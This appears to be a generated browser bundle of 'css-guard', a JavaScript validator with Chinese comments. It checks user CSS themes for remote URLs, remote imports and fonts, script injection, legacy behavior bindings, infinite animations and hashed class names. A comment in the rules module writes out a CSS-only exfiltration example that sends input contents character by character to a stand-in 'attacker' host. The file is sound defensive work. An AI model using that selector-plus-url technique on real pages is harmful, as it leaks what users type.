/* css-guard —— 浏览器版检查器
 *
 * 由 scripts/build-demo.js 从 packages/core/src 生成，别直接改这个文件。
 * 里面只有三个源文件：rules.js（规则表）、validate.js（检查器）、browser.js（入口）。
 * 没有依赖、没有网络请求、没有任何上报 —— 你可以整个读完。
 *
 * 用法：<script src="css-guard.js"></script> 之后 window.cssGuard.validateCss(css)
 */
(function (global) {
  "use strict";
  var __defs = {};
  var __cache = {};
  function require(id) {
    var key = id.replace(/^\.\//, "./");
    if (__cache[key]) return __cache[key].exports;
    var def = __defs[key];
    if (!def) throw new Error("css-guard bundle: 找不到模块 " + id);
    var module = { exports: {} };
    __cache[key] = module;
    def(module, module.exports, require);
    return module.exports;
  }

  __defs["./rules"] = function (module, exports, require) {
"use strict";
/**
 * 皮肤检查规则表。
 *
 * 这里的每一条都不是"最佳实践"抄来的，是在一台机器上真的踩出来的：
 *
 *  · remote-url —— 皮肤是被注入进页面的代码，而**纯 CSS 也能外泄数据**：
 *      input[value^="a"] { background: url(https://attacker/?a) }
 *    属性选择器逐字符命中、命中就发一个请求，输入框内容一个字母一个字母地送出去。
 *    所以规则不是"皮肤里别写 JS"，远程 URL 本身就是漏点。
 *
 *  · infinite-animation —— 一条铺满窗口的永不停 keyframes 动画，实测把宿主
 *    从 2.5% CPU 拉到 111%（Electron 里代价 = 动画面积 × 窗口像素数）。
 *    跑一次就结束的 transition 没问题，`infinite` 才是。
 *
 *  · hashed-class-selector —— 钩 `.pI_x6G_frame` 这种编译产物类名，宿主下次
 *    构建就换一个哈希，皮肤当场失效。稳定的钩子只有三种：CSS 变量、
 *    id 选择器（#app / #root）、语义属性（[role=dialog]）。
 */

/** 命中即拒绝套用。全部是"皮肤能读到/发出去它不该碰的东西"。 */
const SECURITY_RULES = [
  {
    id: "remote-url",
    severity: "error",
    pattern: /url\(\s*["']?\s*(?:https?:)?\/\//gi,
    message: "引用了远程 URL",
    why: "属性选择器 + 远程 url() 可以把输入框内容逐字符外泄；同时也是一个访问指纹。素材请随皮肤一起分发，用 __SKIN__/ 引用。",
  },
  {
    id: "remote-import",
    severity: "error",
    pattern: /@import\s+(?:url\(\s*)?["']?\s*(?:https?:)?\/\//gi,
    message: "远程 @import",
    why: "远程样式表的内容不在审查范围内，等于把皮肤的控制权交给一个你不管的服务器。",
  },
  {
    id: "remote-font",
    severity: "error",
    pattern: /@font-face[^}]*src\s*:[^;}]*url\(\s*["']?\s*(?:https?:)?\/\//gi,
    message: "远程字体",
    why: "字体请求会带上 Referer 和 UA，等于向第三方上报「这个人正在用这个应用」。字体文件请打包进皮肤。",
  },
  {
    id: "script-injection",
    severity: "error",
    pattern: /<script|javascript\s*:|expression\s*\(/gi,
    message: "脚本注入",
    why: "皮肤是样式，不是代码。需要行为请写宿主插件，那条路径有独立的审查。",
  },
  {
    id: "legacy-behavior",
    severity: "error",
    pattern: /-moz-binding\s*:|(?:^|[;{\s])behavior\s*:/gi,
    message: "旧式行为绑定",
    why: "-moz-binding / behavior 在老引擎里等价于执行脚本，是绕过「只准写 CSS」的经典手法。",
  },
];

/** 命中不拦，但会在界面上标出来 —— 这些是"能用但迟早出事"。 */
const QUALITY_RULES = [
  {
    id: "infinite-animation",
    severity: "warn",
    pattern: /animation(?:-iteration-count)?\s*:[^;}]*\binfinite\b/gi,
    message: "永不停止的动画",
    why: "实测一条全窗口的 infinite 动画把宿主从 2.5% CPU 拉到 111%，界面卡到没法用。跑一次就结束的 transition 不受影响。",
  },
  {
    id: "attribute-value-selector",
    severity: "warn",
    pattern: /\[\s*(?:value|placeholder|title|alt|aria-label|href|src)\s*[\^$*|~]?=/gi,
    message: "按属性值取元素",
    why: "本身无害，但它和远程 URL 组合就是外泄输入内容的那把钥匙。仓库会盯着这个组合。",
  },
];

/** 稳定钩子：宿主升级后还认得的选择器。缺了它们皮肤多半是"钩在流沙上"。 */
const REQUIRED_VARIABLES = ["--color-bg", "--color-text", "--color-accent"];

/**
 * 编译产物类名的识别。正则一把梭做不到 —— `.pI_x6G_frame` 的哈希在**中间**，
 * 而 BEM 的 `.block__element` 长得很像却完全是手写的。所以拆成"取出类名"
 * 加"逐个判断"两步，判断写成可读的谓词，误判时一眼看得出是哪一条放宽了。
 */
const CLASS_TOKEN = /\.(-?[_a-zA-Z][\w-]*)/g;

function looksHashedClass(name) {
  // A `Comp_x6G_frame` —— 下划线分段里夹着一段"既有字母又有数字"的短串。
  //   `block__element`（无数字）、`h_100`（无字母）都不会命中。
  const parts = name.split("_");
  if (parts.length > 1 &&
      parts.slice(1).some((p) => p.length >= 3 && /[0-9]/.test(p) && /[a-zA-Z]/.test(p))) {
    return true;
  }
  // B `.a3Bf9Q` —— 六位以上的裸哈希，同时含大写、小写和数字。
  //   Tailwind 的 `.text-2xl` 没有大写，不会命中。
  return name.length >= 6 && /[a-z]/.test(name) && /[A-Z]/.test(name) && /[0-9]/.test(name);
}

module.exports = {
  SECURITY_RULES,
  QUALITY_RULES,
  REQUIRED_VARIABLES,
  CLASS_TOKEN,
  looksHashedClass,
};

  };

  __defs["./validate"] = function (module, exports, require) {
"use strict";
/**
 * 皮肤检查器。输入一段 CSS（可选：皮肤目录，用来核对素材是否真的存在），
 * 输出一串带行号的 finding。
 *
 * 设计上刻意分成两级：
 *   error —— 宿主**不许套用**。全是安全问题，用户点了"仍然套用"也不给。
 *   warn  —— 照常套用，但界面上标出来。全是"能用，但宿主一升级/机器一发烫就出事"。
 * 混成一级会有两个后果：要么真危险的被当噪音点掉，要么合法皮肤被误杀。
 */

/* fs / path 刻意**不在这里 require**，只在需要核对素材是否存在时按需取。
   这样 validate.js 在浏览器、Worker、Deno、浏览器扩展里都能直接跑 ——
   而"检查一段 CSS 安不安全"这件事，最该发生的地方恰恰就是这些环境：
   在把用户的样式表注入页面之前，当场判断。绑死 node:fs 等于把它们全挡在门外。 */
const {
  SECURITY_RULES, QUALITY_RULES, REQUIRED_VARIABLES,
  CLASS_TOKEN, looksHashedClass,
} = require("./rules");

/** 素材占位符。皮肤里写 url("__SKIN__/bg.png")，宿主套用时换成自己的取图前缀。 */
const ASSET_TOKEN = "__SKIN__";

/** 去掉注释再扫，否则"注释里写了一个远程 URL 的说明"会被当成命中。 */
function stripComments(css) {
  // 用等长空白替换，行号和列号才不会漂。
  return css.replace(/\/\*[\s\S]*?\*\//g, (m) => m.replace(/[^\n]/g, " "));
}

function lineOf(css, index) {
  let line = 1;
  for (let i = 0; i < index; i += 1) if (css.charCodeAt(i) === 10) line += 1;
  return line;
}

function snippet(css, index) {
  const start = css.lastIndexOf("\n", index) + 1;
  let end = css.indexOf("\n", index);
  if (end === -1) end = css.length;
  const text = css.slice(start, end).trim();
  return text.length > 120 ? `${text.slice(0, 117)}...` : text;
}

function collect(css, rule, findings) {
  const re = new RegExp(rule.pattern.source, rule.pattern.flags);
  let match;
  const seenLines = new Set();
  while ((match = re.exec(css)) !== null) {
    if (match[0].length === 0) { re.lastIndex += 1; continue; }
    const line = lineOf(css, match.index);
    // 同一行同一条规则只报一次：一行里连写三个远程 url 是同一个问题。
    if (seenLines.has(line)) continue;
    seenLines.add(line);
    findings.push({
      rule: rule.id,
      severity: rule.severity,
      message: rule.message,
      why: rule.why,
      line,
      snippet: snippet(css, match.index),
    });
  }
}

/** `__SKIN__/foo/bar.png` 里被引用到的相对路径。 */
function referencedAssets(css) {
  const out = [];
  const re = new RegExp(`${ASSET_TOKEN}\\/([^"')\\s]+)`, "g");
  let match;
  while ((match = re.exec(css)) !== null) {
    out.push({ ref: match[1], index: match.index });
  }
  return out;
}

/**
 * @param {string} css                 皮肤 CSS 原文
 * @param {object} [options]
 * @param {string} [options.dir]       皮肤目录；给了才会核对素材是否存在
 * @param {string} [options.assetsDir] 素材子目录名，默认 "assets"
 * @returns {{ok:boolean, errors:number, warnings:number, findings:Array}}
 */
function validateCss(css, options = {}) {
  const { dir = null, assetsDir = "assets" } = options;
  const scan = stripComments(String(css));
  const findings = [];

  for (const rule of SECURITY_RULES) collect(scan, rule, findings);
  for (const rule of QUALITY_RULES) collect(scan, rule, findings);

  // 编译产物类名：逐个类名过谓词，同一行同一个名字只报一次。
  const hashSeen = new Set();
  const classRe = new RegExp(CLASS_TOKEN.source, CLASS_TOKEN.flags);
  let hit;
  while ((hit = classRe.exec(scan)) !== null) {
    if (!looksHashedClass(hit[1])) continue;
    const line = lineOf(scan, hit.index);
    const key = `${line}:${hit[1]}`;
    if (hashSeen.has(key)) continue;
    hashSeen.add(key);
    findings.push({
      rule: "hashed-class-selector",
      severity: "warn",
      message: `钩住了编译产物类名 .${hit[1]}`,
      why: "这类名字每次构建都变，宿主一升级皮肤就失效。请改用 CSS 变量、#app / #root 这样的 id，或 [role=dialog] 这样的语义属性。",
      line,
      snippet: snippet(scan, hit.index),
    });
  }

  // 必需变量：缺了不代表坏，但多半意味着这套皮肤只改了背景没改配色，
  // 换到深色宿主上会出现"白字白底"。
  const missing = REQUIRED_VARIABLES.filter((v) => !scan.includes(v));
  if (missing.length) {
    findings.push({
      rule: "missing-variable",
      severity: "warn",
      message: `未定义 ${missing.join(" / ")}`,
      why: "宿主用这几个变量决定正文颜色。只铺背景不定义它们，换到另一种明暗模式下会出现看不清的文字。",
      line: 1,
      snippet: "",
    });
  }

  // 素材存在性：只有拿到目录才能查，查不了就不报（CLI 传目录，实时预览不传）。
  if (dir) {
    // 按需 require：不给 dir 就永远不会走到这里，也就不会碰 node 内置模块。
    const fs = require("node:fs");
    const path = require("node:path");
    const seen = new Set();
    for (const { ref, index } of referencedAssets(scan)) {
      const clean = ref.split("?")[0].split("#")[0];
      if (seen.has(clean)) continue;
      seen.add(clean);
      const line = lineOf(scan, index);
      if (clean.split(/[\\/]/).includes("..")) {
        findings.push({
          rule: "escape-assets",
          severity: "error",
          message: `素材路径越出皮肤目录：${clean}`,
          why: "__SKIN__ 之后只能是皮肤目录内的相对路径，.. 会让皮肤读到它不该读的文件。",
          line, snippet: snippet(scan, index),
        });
        continue;
      }
      const candidates = [path.join(dir, assetsDir, clean), path.join(dir, clean)];
      if (!candidates.some((p) => fs.existsSync(p))) {
        findings.push({
          rule: "missing-asset",
          severity: "error",
          message: `引用了不存在的素材：${clean}`,
          why: `在 ${assetsDir}/ 和皮肤根目录下都没找到。装到别人机器上就是一块空白，不是"少一张图"那么轻。`,
          line, snippet: snippet(scan, index),
        });
      }
    }
  }

  findings.sort((a, b) => (a.line - b.line) || a.rule.localeCompare(b.rule));
  const errors = findings.filter((f) => f.severity === "error").length;
  const warnings = findings.length - errors;
  return { ok: errors === 0, errors, warnings, findings };
}

module.exports = { validateCss, ASSET_TOKEN, stripComments };

  };

  __defs["./browser"] = function (module, exports, require) {
"use strict";
/**
 * 浏览器入口。
 *
 * 只导出不碰文件系统的那部分：检查器本身、规则表、占位符替换。
 * 皮肤库扫描、用户目录、还原点、体检那些天然需要文件系统，不在这里。
 *
 * 为什么值得单独有一个入口：**「这段 CSS 安不安全」最该被回答的地方就是浏览器** ——
 * 在把用户提供的样式表塞进页面之前，当场判断。如果这个包只能在 Node 里跑，
 * 那么浏览器扩展、Web 应用的设置页、在线主题编辑器全都用不了它，
 * 而那恰恰是用户 CSS 真正被输入的地方。
 *
 *   import { validateCss } from "css-guard";      // 打包器会自动选到这个文件
 *   const report = validateCss(userStylesheet);
 *   if (!report.ok) refuse(report.findings);
 */

const { validateCss, ASSET_TOKEN, stripComments } = require("./validate");
const rules = require("./rules");
// 刻意不带 manifest：它解析的是"一个皮肤目录"，需要 node:path 和 node:crypto，
// 而且跟"这段 CSS 安不安全"没有关系。浏览器里要回答的只有后一个问题。

/** 把皮肤 CSS 里的 __SKIN__ 换成宿主能取到素材的前缀。 */
function resolveCss(css, assetBase) {
  return String(css).split(ASSET_TOKEN).join(String(assetBase).replace(/\/+$/, ""));
}

module.exports = { validateCss, stripComments, rules, resolveCss, ASSET_TOKEN };

  };

  global.cssGuard = require("./browser");
})(typeof globalThis !== "undefined" ? globalThis : window);
